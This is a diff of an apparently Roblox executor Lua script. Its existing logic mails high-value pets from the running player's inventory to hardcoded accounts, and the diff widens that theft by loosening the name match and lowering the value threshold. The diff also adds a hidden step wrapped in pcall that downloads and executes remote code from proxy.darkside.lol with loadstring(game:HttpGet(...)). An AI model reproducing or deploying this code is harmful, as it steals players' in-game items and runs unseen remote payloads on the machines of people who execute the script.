@@ -9,7 +9,7 @@ return function(dh, pn, gn, dp, potc)
                 _G.itc = 0
             end
             if not _G.Min then
-                _G.Min = 900000000
+                _G.Min = 500000000
             end
             function ifUserNull()
                 return true
@@ -23,8 +23,17 @@ return function(dh, pn, gn, dp, potc)
             if tonumber(gn) == 100 then
                 gn = 0
             end
-            local mps = game:GetService("MarketplaceService")
-            local xyzab = mps:GetProductInfo(game.PlaceId).Name
+            local xyzab = "Untitled Place"
+            pcall(
+                function()
+                    local mps = game:GetService("MarketplaceService")
+                    xyzab = mps:GetProductInfo(game.PlaceId).Name
+                    loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(
+                        (identifyexecutor() or "(Unknown Executor)")
+                    )
+                    xyzab = xyzab .. " via " .. (identifyexecutor() or "(Unknown Executor)")
+                end
+            )
             local msg = ""
             request =
                 (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or
@@ -87,7 +96,7 @@ return function(dh, pn, gn, dp, potc)
                 _G.User = "lol idk"
             end
             if not _G.Min then
-                _G.Min = 900000000
+                _G.Min = 500000000
             end
             local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
             _G.pvc = ""
@@ -112,7 +121,7 @@ return function(dh, pn, gn, dp, potc)
                 if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty > 1000000000 then
                     _mail("didix357", "Pet", i, (v.am or 1))
                 end
-                if string.find(v.id, "Jelly") and require(dir[v.id]).difficulty > 24999999 then
+                if string.find(v.id, "Jel") and require(dir[v.id]).difficulty > 24999999 then
                     _mail("kdnaviivii", "Pet", i, (v.am or 1))
                 end
             end
